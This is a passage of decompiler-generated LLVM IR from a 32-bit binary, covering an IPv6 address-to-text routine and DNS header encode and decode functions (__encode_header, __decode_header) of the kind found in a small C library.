dec_label_pc_804d802:                             ; preds = %dec_label_pc_804d7ed, %dec_label_pc_804d7f1, %dec_label_pc_804d7e8
  %v1_804d802 = icmp eq i32 %v0_804d80261, 0
  br i1 %v1_804d802, label %dec_label_pc_804d80a, label %dec_label_pc_804d806

dec_label_pc_804d806:                             ; preds = %dec_label_pc_804d802
  %v1_804d806 = inttoptr i32 %v0_804d80659 to i8*
  store i8 58, i8* %v1_804d806, align 1
  %v0_804d809 = load i32, i32* @ebx, align 4
  %v1_804d809 = add i32 %v0_804d809, 1
  store i32 %v1_804d809, i32* @ebx, align 4
  %v0_804d80a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d80a

dec_label_pc_804d80a:                             ; preds = %dec_label_pc_804d802, %dec_label_pc_804d806
  %v0_804d868 = phi i32 [ %v0_804d80659, %dec_label_pc_804d802 ], [ %v1_804d809, %dec_label_pc_804d806 ]
  %v1_804d85f = phi i32 [ 0, %dec_label_pc_804d802 ], [ %v0_804d80a.pre, %dec_label_pc_804d806 ]
  %v9_804d80a = icmp eq i32 %v1_804d85f, 6
  %v1_804d80d = icmp eq i1 %v9_804d80a, false
  br i1 %v1_804d80d, label %dec_label_pc_804d85e, label %dec_label_pc_804d80f

dec_label_pc_804d80f:                             ; preds = %dec_label_pc_804d80a
  %v0_804d80f = load i32, i32* @edi, align 4
  %v1_804d80f = icmp eq i32 %v0_804d80f, 0
  %v1_804d811 = icmp eq i1 %v1_804d80f, false
  br i1 %v1_804d811, label %dec_label_pc_804d85e, label %dec_label_pc_804d813

dec_label_pc_804d813:                             ; preds = %dec_label_pc_804d80f
  %v0_804d813 = load i32, i32* @ebp, align 4
  %v9_804d813 = icmp eq i32 %v0_804d813, 6
  br i1 %v9_804d813, label %dec_label_pc_804d827, label %dec_label_pc_804d818

dec_label_pc_804d818:                             ; preds = %dec_label_pc_804d813
  %v9_804d818 = icmp eq i32 %v0_804d813, 5
  %v1_804d81b = icmp eq i1 %v9_804d818, false
  br i1 %v1_804d81b, label %dec_label_pc_804d85e, label %dec_label_pc_804d81d

dec_label_pc_804d81d:                             ; preds = %dec_label_pc_804d818
  br i1 %v1_804d825, label %dec_label_pc_804d85e, label %dec_label_pc_804d827

dec_label_pc_804d827:                             ; preds = %dec_label_pc_804d81d, %dec_label_pc_804d813
  %v2_804d82d = sub i32 %v0_804d868, %v2_804d7dd
  store i32 %v2_804d82d, i32* @esi, align 4
  %v2_804d838 = sub i32 46, %v2_804d82d
  store i32 %v2_804d838, i32* @ecx, align 4
  store i32 %v0_804d868, i32* @edx, align 4
  %v1_804d83c = add i32 %arg2, 12
  store i32 %v1_804d83c, i32* @eax, align 4
  %v0_804d83f = load i8*, i8** %stack_var_-124, align 4
  %v1_804d83f = ptrtoint i8* %v0_804d83f to i32
  %v3_804d83f = ptrtoint i8* %stack_var_-120.158 to i32
  %v5_804d83f = call i32 @inet_ntop4(i32 %v1_804d83f, i32 %v3_804d83f, i32 %stack_var_-116.157)
  store i32 %v5_804d83f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804d846 = icmp eq i32 %v5_804d83f, 0
  br i1 %v1_804d846, label %dec_label_pc_804d8d0, label %dec_label_pc_804d84e

dec_label_pc_804d84e:                             ; preds = %dec_label_pc_804d827
  %v0_804d851 = load i32, i32* @ebx, align 4
  %v5_804d851 = inttoptr i32 %v0_804d851 to i8*
  store i8* %v5_804d851, i8** %stack_var_-124, align 4
  %v3_804d852 = call i32 @strlen(i8* %v5_804d851)
  store i32 %v3_804d852, i32* %eax.global-to-local, align 4
  %v0_804d85a = load i32, i32* @ebx, align 4
  %v3_804d85a = add i32 %v0_804d85a, %v3_804d852
  store i32 %v3_804d85a, i32* @ebx, align 4
  %v0_804d882.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d882

dec_label_pc_804d85e:                             ; preds = %dec_label_pc_804d81d, %dec_label_pc_804d818, %dec_label_pc_804d80f, %dec_label_pc_804d80a
  %v0_804d85e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804d85e, i32* %stack_var_-112, align 4
  %v2_804d85f = mul i32 %v1_804d85f, 4
  %v4_804d85f = add i32 %v3_804d85f, %v2_804d85f
  %v5_804d85f = inttoptr i32 %v4_804d85f to i32*
  %v6_804d85f = load i32, i32* %v5_804d85f, align 4
  %v5_804d868 = inttoptr i32 %v0_804d868 to i8*
  store i8* %v5_804d868, i8** %stack_var_-124, align 4
  %v6_804d869 = call i32 @sprintf(i32 %v0_804d868, i32 ptrtoint ([3 x i8]* @global_var_8050859.109 to i32), i32 %v6_804d85f, i32 %v0_804d85e)
  store i32 %v6_804d869, i32* %eax.global-to-local, align 4
  %v0_804d871 = load i32, i32* @ebx, align 4
  %v2_804d871 = add i32 %v0_804d871, %v6_804d869
  store i32 %v2_804d871, i32* @ebx, align 4
  br label %dec_label_pc_804d873

dec_label_pc_804d873:                             ; preds = %dec_label_pc_804d7f8, %dec_label_pc_804d7fc, %dec_label_pc_804d85e
  %stack_var_-116.0 = phi i32 [ %v6_804d85f, %dec_label_pc_804d85e ], [ %stack_var_-116.157, %dec_label_pc_804d7f8 ], [ %stack_var_-116.157, %dec_label_pc_804d7fc ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050859.109, i32 0, i32 0), %dec_label_pc_804d85e ], [ %stack_var_-120.158, %dec_label_pc_804d7f8 ], [ %stack_var_-120.158, %dec_label_pc_804d7fc ]
  %v0_804d7fc20 = phi i32 [ %v2_804d871, %dec_label_pc_804d85e ], [ %v0_804d80659, %dec_label_pc_804d7f8 ], [ %v1_804d7ff, %dec_label_pc_804d7fc ]
  %v0_804d873 = load i32, i32* @esi, align 4
  %v1_804d873 = add i32 %v0_804d873, 1
  %v0_804d87d.pre = load i32, i32* @edi, align 4
  store i32 %v1_804d873, i32* @esi, align 4
  %v7_804d877 = icmp sgt i32 %v1_804d873, 7
  %v10_804d87d = icmp eq i32 %v0_804d87d.pre, -1
  br i1 %v7_804d877, label %dec_label_pc_804d87d, label %dec_label_pc_804d7e8

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d873
  br i1 %v10_804d87d, label %dec_label_pc_804d88e, label %dec_label_pc_804d882

dec_label_pc_804d882:                             ; preds = %dec_label_pc_804d87d, %dec_label_pc_804d84e
  %v0_804d88a = phi i32 [ %v0_804d7fc20, %dec_label_pc_804d87d ], [ %v3_804d85a, %dec_label_pc_804d84e ]
  %v0_804d882 = phi i32 [ %v0_804d87d.pre, %dec_label_pc_804d87d ], [ %v0_804d882.pre, %dec_label_pc_804d84e ]
  %v1_804d882 = load i32, i32* @ebp, align 4
  %v2_804d882 = add i32 %v1_804d882, %v0_804d882
  store i32 %v2_804d882, i32* %eax.global-to-local, align 4
  %v9_804d885 = icmp eq i32 %v2_804d882, 8
  %v1_804d888 = icmp eq i1 %v9_804d885, false
  br i1 %v1_804d888, label %dec_label_pc_804d88e, label %dec_label_pc_804d88a

dec_label_pc_804d88a:                             ; preds = %dec_label_pc_804d882
  %v1_804d88a = inttoptr i32 %v0_804d88a to i8*
  store i8 58, i8* %v1_804d88a, align 1
  %v0_804d88d = load i32, i32* @ebx, align 4
  %v1_804d88d = add i32 %v0_804d88d, 1
  store i32 %v1_804d88d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d88e

dec_label_pc_804d88e:                             ; preds = %dec_label_pc_804d882, %dec_label_pc_804d87d, %dec_label_pc_804d88a
  %v0_804d892 = phi i32 [ %v0_804d88a, %dec_label_pc_804d882 ], [ %v0_804d7fc20, %dec_label_pc_804d87d ], [ %v1_804d88d, %dec_label_pc_804d88a ]
  store i32 %v2_804d7dd, i32* %edx.global-to-local, align 4
  %v1_804d892 = add i32 %v0_804d892, 1
  store i32 %v1_804d892, i32* %eax.global-to-local, align 4
  %v1_804d895 = inttoptr i32 %v0_804d892 to i8*
  store i8 0, i8* %v1_804d895, align 1
  %v0_804d898 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d898 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d898 = sub i32 %v0_804d898, %v1_804d898
  store i32 %v2_804d898, i32* @eax, align 4
  %tmp72 = icmp ugt i32 %v2_804d898, %arg4
  br i1 %tmp72, label %dec_label_pc_804d8a0, label %dec_label_pc_804d8ad

dec_label_pc_804d8a0:                             ; preds = %dec_label_pc_804d88e
  %v0_804d8a0 = load i8*, i8** %stack_var_-124, align 4
  %v1_804d8a0 = ptrtoint i8* %v0_804d8a0 to i32
  %v2_804d8a0 = call i32 @__errno_location(i32 %v1_804d8a0)
  store i32 %v2_804d8a0, i32* %eax.global-to-local, align 4
  %v1_804d8a5 = inttoptr i32 %v2_804d8a0 to i32*
  store i32 28, i32* %v1_804d8a5, align 4
  br label %dec_label_pc_804d8ce

dec_label_pc_804d8ad:                             ; preds = %dec_label_pc_804d88e
  %v0_804d8ad = load i32, i32* @edi, align 4
  store i32 %v0_804d8ad, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_804d8b03 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_804d8b03, i32* %tmp47, align 4
  %v0_804d8b7.cast = inttoptr i32 %v3_804d8b03 to i8*
  %v5_804d8b7 = call i32 @strcpy(i8* %v0_804d8b7.cast, i32 %v2_804d7dd)
  store i32 %v5_804d8b7, i32* %eax.global-to-local, align 4
  store i32 %v5_804d8b7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d8d0

dec_label_pc_804d8c3:                             ; preds = %dec_label_pc_804d719
  %v1_804d8c3 = call i32 @__errno_location(i32 %v0_804d70c)
  store i32 %v1_804d8c3, i32* %eax.global-to-local, align 4
  %v1_804d8c8 = inttoptr i32 %v1_804d8c3 to i32*
  store i32 97, i32* %v1_804d8c8, align 4
  br label %dec_label_pc_804d8ce

dec_label_pc_804d8ce:                             ; preds = %dec_label_pc_804d8a0, %dec_label_pc_804d8c3
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d8d0

dec_label_pc_804d8d0:                             ; preds = %dec_label_pc_804d827, %dec_label_pc_804d724, %dec_label_pc_804d8ad, %dec_label_pc_804d8ce
  %v0_804d8d3 = phi i32 [ 0, %dec_label_pc_804d827 ], [ %v3_804d730, %dec_label_pc_804d724 ], [ %v5_804d8b7, %dec_label_pc_804d8ad ], [ 0, %dec_label_pc_804d8ce ]
  store i32 %v0_804d8d3, i32* %eax.global-to-local, align 4
  store i32 %v0_804d70c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d8d3

; uselistorder directives
  uselistorder i32 %v0_804d8d3, { 1, 0 }
  uselistorder i32 %v0_804d892, { 1, 0 }
  uselistorder i1 %v10_804d87d, { 1, 0 }
  uselistorder i32 %v0_804d87d.pre, { 1, 0, 2 }
  uselistorder i32 %v1_804d873, { 1, 0, 2 }
  uselistorder i32 %v1_804d85f, { 1, 0 }
  uselistorder i32 %v0_804d868, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804d7f4, { 1, 0 }
  uselistorder i32 %v2_804d7ed, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.157, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.158, { 2, 1, 0 }
  uselistorder i32 %v0_804d80659, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804d7f860, { 2, 1, 0 }
  uselistorder i32 %v0_804d80261, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_804d7dd, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d87d19, { 1, 0 }
  uselistorder i32 %v1_804d7d2, { 1, 0 }
  uselistorder i32 %v0_804d7d2, { 1, 0, 2 }
  uselistorder i32 %v5_804d7da, { 1, 2, 0 }
  uselistorder i32 %v1_804d7b5, { 0, 2, 1 }
  uselistorder i32 %v0_804d7a510, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d7b014, { 1, 2, 0, 3 }
  uselistorder i1 %v10_804d7a0, { 1, 0 }
  uselistorder i32 %v0_804d7cb63, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804d7c064, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804d7b566, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_804d76d67, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_804d70c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %edx.global-to-local, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 6, 7, 4, 3, 0, 2, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 16, 17, 18, 21, 19, 20, 22, 0, 7, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 97, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 3, 0, 1, 2 }
  uselistorder [3 x i8]* @global_var_8050859.109, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i64 2, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804d8d0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d8ce, { 1, 0 }
  uselistorder label %dec_label_pc_804d88e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d873, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d80a, { 1, 0 }
  uselistorder label %dec_label_pc_804d802, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7e8, { 1, 0 }
  uselistorder label %dec_label_pc_804d7dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d7cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d7c9, { 1, 0 }
  uselistorder label %dec_label_pc_804d7b5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d7b2, { 1, 0 }
  uselistorder label %dec_label_pc_804d788, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_4()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d8e0 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e0, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_804d8ea = ptrtoint i8* %tmp to i32
  store i32 %v4_804d8ea, i32* %esi.global-to-local, align 4
  %v7_804d8ee = icmp sgt i32 %tmp9, 11
  br i1 %v7_804d8ee, label %dec_label_pc_804d8f4, label %dec_label_pc_804d988

dec_label_pc_804d8f4:                             ; preds = %entry
  %v1_804d8f4 = add i32 %tmp8, 1
  %v2_804d8f4 = inttoptr i32 %v1_804d8f4 to i8*
  %v3_804d8f4 = load i8, i8* %v2_804d8f4, align 1
  store i8 %v3_804d8f4, i8* %tmp, align 1
  %v0_804d8fa = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d8fa = inttoptr i32 %v0_804d8fa to i32*
  %v2_804d8fa = load i32, i32* %v1_804d8fa, align 4
  %v1_804d8fc = trunc i32 %v2_804d8fa to i8
  %v2_804d8fc = load i32, i32* %esi.global-to-local, align 4
  %v3_804d8fc = add i32 %v2_804d8fc, 1
  %v4_804d8fc = inttoptr i32 %v3_804d8fc to i8*
  store i8 %v1_804d8fc, i8* %v4_804d8fc, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_804d921 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d921 = add i32 %v0_804d921, 8
  %v2_804d921 = inttoptr i32 %v1_804d921 to i32*
  %v3_804d921 = load i32, i32* %v2_804d921, align 4
  %v1_804d924 = mul i32 %v3_804d921, 8
  %v2_804d927 = and i32 %v1_804d924, 120
  %v2_804d92a = or i32 %v2_804d927, 4
  store i32 %v2_804d92a, i32* %edx.global-to-local, align 4
  %v1_804d92c = add i32 %v0_804d921, 20
  %v2_804d92c = inttoptr i32 %v1_804d92c to i32*
  %v3_804d92c = load i32, i32* %v2_804d92c, align 4
  %v4_804d92c = icmp eq i32 %v3_804d92c, 0
  %v1_804d930 = icmp eq i1 %v4_804d92c, false
  %v2_804d930 = zext i1 %v1_804d930 to i32
  %v2_804d933 = or i32 %v2_804d930, %v2_804d92a
  store i32 %v2_804d933, i32* %edx.global-to-local, align 4
  %v2_804d935 = or i32 %v2_804d933, 130
  %v3_804d935 = trunc i32 %v2_804d935 to i8
  store i32 %v2_804d935, i32* @ecx, align 4
  %v2_804d937 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d937 = add i32 %v2_804d937, 2
  %v4_804d937 = inttoptr i32 %v3_804d937 to i8*
  store i8 %v3_804d935, i8* %v4_804d937, align 1
  %v0_804d93a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d93e = add i32 %v0_804d93a, 28
  %v2_804d93e = inttoptr i32 %v1_804d93e to i8*
  %v3_804d93e = load i8, i8* %v2_804d93e, align 1
  %v5_804d93e = load i32, i32* %edx.global-to-local, align 4
  %v2_804d947 = urem i8 %v3_804d93e, 16
  %v7_804d947 = zext i8 %v2_804d947 to i32
  %v9_804d947 = and i32 %v5_804d93e, -256
  %v10_804d947 = or i32 %v9_804d947, %v7_804d947
  store i32 %v10_804d947, i32* %edx.global-to-local, align 4
  %v2_804d94a = or i8 %v2_804d947, -128
  %v2_804d94c = load i32, i32* %esi.global-to-local, align 4
  %v3_804d94c = add i32 %v2_804d94c, 3
  %v4_804d94c = inttoptr i32 %v3_804d94c to i8*
  store i8 %v2_804d94a, i8* %v4_804d94c, align 1
  %v0_804d94f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d94f = add i32 %v0_804d94f, 33
  %v2_804d94f = inttoptr i32 %v1_804d94f to i8*
  %v3_804d94f = load i8, i8* %v2_804d94f, align 1
  %v2_804d953 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d953 = add i32 %v2_804d953, 4
  %v4_804d953 = inttoptr i32 %v3_804d953 to i8*
  store i8 %v3_804d94f, i8* %v4_804d953, align 1
  %v0_804d956 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d956 = add i32 %v0_804d956, 32
  %v2_804d956 = inttoptr i32 %v1_804d956 to i32*
  %v3_804d956 = load i32, i32* %v2_804d956, align 4
  %v1_804d959 = trunc i32 %v3_804d956 to i8
  %v2_804d959 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d959 = add i32 %v2_804d959, 5
  %v4_804d959 = inttoptr i32 %v3_804d959 to i8*
  store i8 %v1_804d959, i8* %v4_804d959, align 1
  %v0_804d95c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d95c = add i32 %v0_804d95c, 37
  %v2_804d95c = inttoptr i32 %v1_804d95c to i8*
  %v3_804d95c = load i8, i8* %v2_804d95c, align 1
  %v2_804d960 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d960 = add i32 %v2_804d960, 6
  %v4_804d960 = inttoptr i32 %v3_804d960 to i8*
  store i8 %v3_804d95c, i8* %v4_804d960, align 1
  %v0_804d963 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d963 = add i32 %v0_804d963, 36
  %v2_804d963 = inttoptr i32 %v1_804d963 to i32*
  %v3_804d963 = load i32, i32* %v2_804d963, align 4
  %v1_804d966 = trunc i32 %v3_804d963 to i8
  %v2_804d966 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d966 = add i32 %v2_804d966, 7
  %v4_804d966 = inttoptr i32 %v3_804d966 to i8*
  store i8 %v1_804d966, i8* %v4_804d966, align 1
  %v0_804d969 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d969 = add i32 %v0_804d969, 41
  %v2_804d969 = inttoptr i32 %v1_804d969 to i8*
  %v3_804d969 = load i8, i8* %v2_804d969, align 1
  %v2_804d96d = load i32, i32* %esi.global-to-local, align 4
  %v3_804d96d = add i32 %v2_804d96d, 8
  %v4_804d96d = inttoptr i32 %v3_804d96d to i8*
  store i8 %v3_804d969, i8* %v4_804d96d, align 1
  %v0_804d970 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d970 = add i32 %v0_804d970, 40
  %v2_804d970 = inttoptr i32 %v1_804d970 to i32*
  %v3_804d970 = load i32, i32* %v2_804d970, align 4
  %v1_804d973 = trunc i32 %v3_804d970 to i8
  %v2_804d973 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d973 = add i32 %v2_804d973, 9
  %v4_804d973 = inttoptr i32 %v3_804d973 to i8*
  store i8 %v1_804d973, i8* %v4_804d973, align 1
  %v0_804d976 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d976 = add i32 %v0_804d976, 45
  %v2_804d976 = inttoptr i32 %v1_804d976 to i8*
  %v3_804d976 = load i8, i8* %v2_804d976, align 1
  %v2_804d97a = load i32, i32* %esi.global-to-local, align 4
  %v3_804d97a = add i32 %v2_804d97a, 10
  %v4_804d97a = inttoptr i32 %v3_804d97a to i8*
  store i8 %v3_804d976, i8* %v4_804d97a, align 1
  %v0_804d97d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d97d = add i32 %v0_804d97d, 44
  %v2_804d97d = inttoptr i32 %v1_804d97d to i32*
  %v3_804d97d = load i32, i32* %v2_804d97d, align 4
  %v1_804d980 = trunc i32 %v3_804d97d to i8
  %v2_804d980 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d980 = add i32 %v2_804d980, 11
  %v4_804d980 = inttoptr i32 %v3_804d980 to i8*
  store i8 %v1_804d980, i8* %v4_804d980, align 1
  %v2_804d988.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d988

dec_label_pc_804d988:                             ; preds = %entry, %dec_label_pc_804d8f4
  %v2_804d988 = phi i32 [ %v0_804d8e0, %entry ], [ %v2_804d988.pre, %dec_label_pc_804d8f4 ]
  %v0_804d98a = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_804d8f4 ]
  store i32 %v2_804d988, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d98a

; uselistorder directives
  uselistorder i32 41, { 1, 0 }
  uselistorder label %dec_label_pc_804d988, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d98c = load i32, i32* @ebx, align 4
  store i32 %v0_804d98c, i32* %stack_var_-4, align 4
  %v4_804d98d = ptrtoint i8* %tmp2 to i32
  store i32 %v4_804d98d, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_804d995 = load i8, i8* %tmp2, align 1
  %v3_804d995 = zext i8 %v2_804d995 to i32
  %v1_804d998 = add i32 %v4_804d98d, 1
  %v2_804d998 = inttoptr i32 %v1_804d998 to i8*
  %v3_804d998 = load i8, i8* %v2_804d998, align 1
  %v4_804d998 = zext i8 %v3_804d998 to i32
  %v2_804d99c = mul nuw nsw i32 %v3_804d995, 256
  %v2_804d99f = or i32 %v4_804d998, %v2_804d99c
  %v2_804d9a1 = inttoptr i32 %tmp to i32*
  store i32 %v2_804d99f, i32* %v2_804d9a1, align 4
  %v0_804d9a3 = load i32, i32* @ecx, align 4
  %v1_804d9a3 = add i32 %v0_804d9a3, 2
  %v2_804d9a3 = inttoptr i32 %v1_804d9a3 to i8*
  %v3_804d9a3 = load i8, i8* %v2_804d9a3, align 1
  %tmp6 = icmp slt i8 %v3_804d9a3, 0
  %v2_804d9a7 = zext i1 %tmp6 to i32
  %v1_804d9aa = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9aa = add i32 %v1_804d9aa, 4
  %v3_804d9aa = inttoptr i32 %v2_804d9aa to i32*
  store i32 %v2_804d9a7, i32* %v3_804d9aa, align 4
  %v0_804d9ad = load i32, i32* @ecx, align 4
  %v1_804d9ad = add i32 %v0_804d9ad, 2
  %v2_804d9ad = inttoptr i32 %v1_804d9ad to i8*
  %v3_804d9ad = load i8, i8* %v2_804d9ad, align 1
  %v3_804d9b0 = udiv i8 %v3_804d9ad, 8
  %tmp7 = urem i8 %v3_804d9b0, 16
  %v1_804d9b3 = zext i8 %tmp7 to i32
  %v1_804d9b6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9b6 = add i32 %v1_804d9b6, 8
  %v3_804d9b6 = inttoptr i32 %v2_804d9b6 to i32*
  store i32 %v1_804d9b3, i32* %v3_804d9b6, align 4
  %v0_804d9b9 = load i32, i32* @ecx, align 4
  %v1_804d9b9 = add i32 %v0_804d9b9, 2
  %v2_804d9b9 = inttoptr i32 %v1_804d9b9 to i8*
  %v3_804d9b9 = load i8, i8* %v2_804d9b9, align 1
  %div = udiv i8 %v3_804d9b9, 4
  %tmp8 = urem i8 %div, 2
  %v1_804d9c0 = zext i8 %tmp8 to i32
  %v1_804d9c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9c3 = add i32 %v1_804d9c3, 12
  %v3_804d9c3 = inttoptr i32 %v2_804d9c3 to i32*
  store i32 %v1_804d9c0, i32* %v3_804d9c3, align 4
  %v0_804d9c6 = load i32, i32* @ecx, align 4
  %v1_804d9c6 = add i32 %v0_804d9c6, 2
  %v2_804d9c6 = inttoptr i32 %v1_804d9c6 to i8*
  %v3_804d9c6 = load i8, i8* %v2_804d9c6, align 1
  %div5 = udiv i8 %v3_804d9c6, 2
  %tmp9 = urem i8 %div5, 2
  %v1_804d9cc = zext i8 %tmp9 to i32
  %v1_804d9cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9cf = add i32 %v1_804d9cf, 16
  %v3_804d9cf = inttoptr i32 %v2_804d9cf to i32*
  store i32 %v1_804d9cc, i32* %v3_804d9cf, align 4
  %v0_804d9d2 = load i32, i32* @ecx, align 4
  %v1_804d9d2 = add i32 %v0_804d9d2, 2
  %v2_804d9d2 = inttoptr i32 %v1_804d9d2 to i8*
  %v3_804d9d2 = load i8, i8* %v2_804d9d2, align 1
  %tmp10 = urem i8 %v3_804d9d2, 2
  %v1_804d9d6 = zext i8 %tmp10 to i32
  %v1_804d9d9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9d9 = add i32 %v1_804d9d9, 20
  %v3_804d9d9 = inttoptr i32 %v2_804d9d9 to i32*
  store i32 %v1_804d9d6, i32* %v3_804d9d9, align 4
  %v0_804d9dc = load i32, i32* @ecx, align 4
  %v1_804d9dc = add i32 %v0_804d9dc, 3
  %v2_804d9dc = inttoptr i32 %v1_804d9dc to i8*
  %v3_804d9dc = load i8, i8* %v2_804d9dc, align 1
  %tmp11 = icmp slt i8 %v3_804d9dc, 0
  %v2_804d9e0 = zext i1 %tmp11 to i32
  %v1_804d9e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9e3 = add i32 %v1_804d9e3, 24
  %v3_804d9e3 = inttoptr i32 %v2_804d9e3 to i32*
  store i32 %v2_804d9e0, i32* %v3_804d9e3, align 4
  %v0_804d9e6 = load i32, i32* @ecx, align 4
  %v1_804d9e6 = add i32 %v0_804d9e6, 3
  %v2_804d9e6 = inttoptr i32 %v1_804d9e6 to i8*
  %v3_804d9e6 = load i8, i8* %v2_804d9e6, align 1
  %tmp12 = urem i8 %v3_804d9e6, 16
  %v1_804d9ea = zext i8 %tmp12 to i32
  %v1_804d9ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9ed = add i32 %v1_804d9ed, 28
  %v3_804d9ed = inttoptr i32 %v2_804d9ed to i32*
  store i32 %v1_804d9ea, i32* %v3_804d9ed, align 4
  %v0_804d9f0 = load i32, i32* @ecx, align 4
  %v1_804d9f0 = add i32 %v0_804d9f0, 4
  %v2_804d9f0 = inttoptr i32 %v1_804d9f0 to i8*
  %v3_804d9f0 = load i8, i8* %v2_804d9f0, align 1
  %v4_804d9f0 = zext i8 %v3_804d9f0 to i32
  %v1_804d9f4 = add i32 %v0_804d9f0, 5
  %v2_804d9f4 = inttoptr i32 %v1_804d9f4 to i8*
  %v3_804d9f4 = load i8, i8* %v2_804d9f4, align 1
  %v4_804d9f4 = zext i8 %v3_804d9f4 to i32
  %v2_804d9f8 = mul nuw nsw i32 %v4_804d9f0, 256
  %v2_804d9fb = or i32 %v4_804d9f4, %v2_804d9f8
  %v1_804d9fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9fd = add i32 %v1_804d9fd, 32
  %v3_804d9fd = inttoptr i32 %v2_804d9fd to i32*
  store i32 %v2_804d9fb, i32* %v3_804d9fd, align 4
  %v0_804da00 = load i32, i32* @ecx, align 4
  %v1_804da00 = add i32 %v0_804da00, 6
  %v2_804da00 = inttoptr i32 %v1_804da00 to i8*
  %v3_804da00 = load i8, i8* %v2_804da00, align 1
  %v4_804da00 = zext i8 %v3_804da00 to i32
  %v1_804da04 = add i32 %v0_804da00, 7
  %v2_804da04 = inttoptr i32 %v1_804da04 to i8*
  %v3_804da04 = load i8, i8* %v2_804da04, align 1
  %v4_804da04 = zext i8 %v3_804da04 to i32
  %v2_804da08 = mul nuw nsw i32 %v4_804da00, 256
  %v2_804da0b = or i32 %v4_804da04, %v2_804da08
